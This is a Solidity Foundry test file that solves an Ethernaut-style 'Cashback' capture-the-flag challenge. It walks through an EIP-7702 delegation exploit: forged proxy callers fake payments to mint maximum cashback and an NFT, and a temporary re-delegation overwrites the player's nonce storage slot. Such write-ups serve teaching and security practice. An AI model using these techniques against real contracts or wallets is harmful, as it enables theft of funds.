// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Cashback, Currency} from "../../src/challenge-36-cashback/Cashback.sol";
import {SuperCashbackNFT, FreedomCoin} from "../../src/challenge-36-cashback/CashbackFactory.sol";

import {ForgedProxyFactory} from "../../src/challenge-36-cashback/ForgedProxyFactory.sol";
import {FreeDelegationLogic} from "../../src/challenge-36-cashback/FreeDelegationLogic.sol";
import {NativeDelegationLogic} from "../../src/challenge-36-cashback/NativeDelegationLogic.sol";
import {NonceSetter} from "../../src/challenge-36-cashback/NonceSetter.sol";

contract CashbackTest is Test {
    FreedomCoin public FREE;
    address constant NATIVE_CURRENCY = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address constant BOB = address(0xB0B);
    uint256 constant NATIVE_CASHBACK_RATE = 50; // 0.5%
    uint256 constant FREE_CASHBACK_RATE = 200; // 2%
    uint256 constant NATIVE_MAX_CASHBACK = 1 ether;
    uint256 constant FREE_MAX_CASHBACK = 500 ether;
    uint256 constant SUPERCASHBACK_NONCE = 10000;

    Cashback public cashback;
    Account public playerAccount;
    address public player;
    address public receiver = makeAddr("receiver");

    SuperCashbackNFT superCashbackNFT;

    function setUp() public {
        superCashbackNFT = new SuperCashbackNFT();

        FREE = new FreedomCoin();
        FREE.mint(BOB, 100 ether);

        address[] memory cashbackCurrencies = new address[](2);
        cashbackCurrencies[0] = NATIVE_CURRENCY;
        cashbackCurrencies[1] = address(FREE);

        uint256[] memory cashbackRates = new uint256[](2);
        cashbackRates[0] = NATIVE_CASHBACK_RATE;
        cashbackRates[1] = FREE_CASHBACK_RATE;

        uint256[] memory maxCashback = new uint256[](2);
        maxCashback[0] = NATIVE_MAX_CASHBACK;
        maxCashback[1] = FREE_MAX_CASHBACK;

        cashback = new Cashback(cashbackCurrencies, cashbackRates, maxCashback, address(superCashbackNFT));

        superCashbackNFT.transferOwnership(address(cashback));

        playerAccount = makeAccount("player");
        player = playerAccount.addr;

        vm.deal(player, 10 ether);

        vm.label(address(cashback), "Cashback");
        vm.label(player, "Player");

        console.log("Cashback", address(cashback));
        console.log("Player", player);
    }

    function testDelegatedEOACanExecutePayWithCashback() public {
        vm.signAndAttachDelegation(address(cashback), playerAccount.key);

        //console.logBytes(player.code);

        vm.prank(player, player);
        Cashback(payable(player)).payWithCashback(Currency.wrap(NATIVE_CURRENCY), receiver, 1 ether);

        uint256 id = uint256(uint160(NATIVE_CURRENCY));
        console.log("cashback balance", cashback.balanceOf(player, id));

        //  Logs:
        //      Cashback 0x2e234DAe75C793f67A35089C9d99245E1C58470b
        //      Player 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
        //      payWithCashback msg.sender 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
        //      payWithCashback address(this) 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
        //      accrueCashback msg.sender 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
        //      accrueCashback address(this) 0x2e234DAe75C793f67A35089C9d99245E1C58470b
        //      consumeNonce msg.sender 0x2e234DAe75C793f67A35089C9d99245E1C58470b
        //      consumeNonce address(this) 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
        //      cashback balance 5000000000000000
    }

    /* function testIncreaseNonceAndMintsNftWithRepeatedOneWeiPayments() public {
        vm.signAndAttachDelegation(address(cashback), playerAccount.key);

        vm.startPrank(player, player);
        for (uint256 i = 0; i < SUPERCASHBACK_NONCE; i++) {
            Cashback(payable(player)).payWithCashback(Currency.wrap(NATIVE_CURRENCY), receiver, 1 wei);
        }
        vm.stopPrank();

        uint256 nonce = Cashback(payable(player)).nonce();
        assertEq(nonce, SUPERCASHBACK_NONCE);

        uint256 playerNftBalance = superCashbackNFT.balanceOf(player);
        assertEq(playerNftBalance, 1);
    }

    function testMaxNativeCashbackBySelfTransferringETH() public {
        vm.signAndAttachDelegation(address(cashback), playerAccount.key);

        vm.startPrank(player, player);
        for (uint256 i = 0; i < 200; i++) {
            Cashback(payable(player)).payWithCashback(Currency.wrap(NATIVE_CURRENCY), player, 1 ether);
        }
        vm.stopPrank();

        uint256 nativeId = Currency.wrap(NATIVE_CURRENCY).toId();
        assertEq(cashback.balanceOf(player, nativeId), 1 ether);
    } */

    function testSetPlayerNonceWithTemporaryDelegation() public {
        NonceSetter nonceSetter = new NonceSetter();

        // Step 1: temporarily delegate player to NonceSetter
        vm.signAndAttachDelegation(address(nonceSetter), playerAccount.key);

        vm.prank(player, player);
        NonceSetter(payable(player)).setNonce();

        assertEq(NonceSetter(payable(player)).nonce(), SUPERCASHBACK_NONCE - 1);

        // Step 2: delegate player back to Cashback
        vm.signAndAttachDelegation(address(cashback), playerAccount.key);

        // Step 3: one cashback call increments nonce from 9999 to 10000
        vm.prank(player, player);
        Cashback(payable(player)).payWithCashback(Currency.wrap(NATIVE_CURRENCY), receiver, 1 wei);

        assertEq(Cashback(payable(player)).nonce(), SUPERCASHBACK_NONCE);
        assertEq(superCashbackNFT.ownerOf(uint256(uint160(player))), player);
    }

    function testAccrueFreeCashbackAndMintNftWithForgedDelegationCaller() public {
        FreeDelegationLogic logic =
            new FreeDelegationLogic(address(cashback), address(FREE), player, address(superCashbackNFT));

        ForgedProxyFactory factory = new ForgedProxyFactory();

        address forgedCaller = factory.deploy(address(cashback), address(logic));

        FreeDelegationLogic(forgedCaller).attackFreeCashback();

        uint256 freeId = Currency.wrap(address(FREE)).toId();

        assertEq(cashback.balanceOf(player, freeId), 500 ether);

        uint256 playerNftBalance = superCashbackNFT.balanceOf(player);
        assertEq(playerNftBalance, 1);
    }

    function testSolveCashbackChallenge() public {
        // Factory used to deploy forged EIP-7702 callers (custom bytecode proxies)
        ForgedProxyFactory factory = new ForgedProxyFactory();

        // ------------------------------------------------------------
        // STEP 1 — Exploit FREE cashback
        // ------------------------------------------------------------
        // We deploy a forged caller that bypasses Cashback checks and
        // calls `accrueCashback` with a fake large amount.
        // This mints the maximum FREE cashback (500 ether) and one NFT,
        // both transferred to the player.
        FreeDelegationLogic freeLogic =
            new FreeDelegationLogic(address(cashback), address(FREE), player, address(superCashbackNFT));

        address forgedFreeCaller = factory.deploy(address(cashback), address(freeLogic));
        FreeDelegationLogic(forgedFreeCaller).attackFreeCashback();

        // ------------------------------------------------------------
        // STEP 2 — Exploit NATIVE cashback
        // ------------------------------------------------------------
        // Same idea, but for native currency:
        // we fake a 200 ETH payment to get the max cashback (1 ether)
        // without actually sending ETH.
        NativeDelegationLogic nativeLogic =
            new NativeDelegationLogic(address(cashback), player, address(superCashbackNFT));

        address forgedNativeCaller = factory.deploy(address(cashback), address(nativeLogic));
        NativeDelegationLogic(forgedNativeCaller).attackNativeCashback();

        // ------------------------------------------------------------
        // STEP 3 — Set player nonce to 9999 using temporary delegation
        // ------------------------------------------------------------
        // We temporarily delegate the player to a helper contract that
        // shares the same storage layout as Cashback.
        // This lets us directly write into the player's nonce storage slot.
        NonceSetter nonceSetter = new NonceSetter();

        vm.signAndAttachDelegation(address(nonceSetter), playerAccount.key);

        vm.prank(player, player);
        NonceSetter(payable(player)).setNonce(); // sets nonce = 9999

        // ------------------------------------------------------------
        // STEP 4 — Delegate player back to Cashback and trigger mint
        // ------------------------------------------------------------
        // We restore delegation to Cashback so calls are routed correctly.
        // One call increments nonce from 9999 → 10000 and mints the
        // player-specific Super Cashback NFT.
        vm.signAndAttachDelegation(address(cashback), playerAccount.key);

        vm.prank(player, player);
        Cashback(payable(player)).payWithCashback(Currency.wrap(NATIVE_CURRENCY), receiver, 1 wei);

        // ------------------------------------------------------------
        // STEP 5 — Validate final state (matches Ethernaut requirements)
        // ------------------------------------------------------------
        uint256 nativeId = Currency.wrap(NATIVE_CURRENCY).toId();
        uint256 freeId = Currency.wrap(address(FREE)).toId();

        // Max cashback balances achieved
        assertEq(cashback.balanceOf(player, nativeId), 1 ether);
        assertEq(cashback.balanceOf(player, freeId), 500 ether);

        // Player owns the NFT tied to their address
        assertEq(superCashbackNFT.ownerOf(uint256(uint160(player))), player);

        // Player owns at least 2 NFTs (one forged + one legitimate)
        assertGe(superCashbackNFT.balanceOf(player), 2);

        // Player code must match EIP-7702 delegated format
        bytes23 expectedCode = bytes23(bytes.concat(hex"ef0100", abi.encodePacked(address(cashback))));
        assertEq(player.code.length, 23);
        assertEq(bytes23(player.code), expectedCode);
    }
}
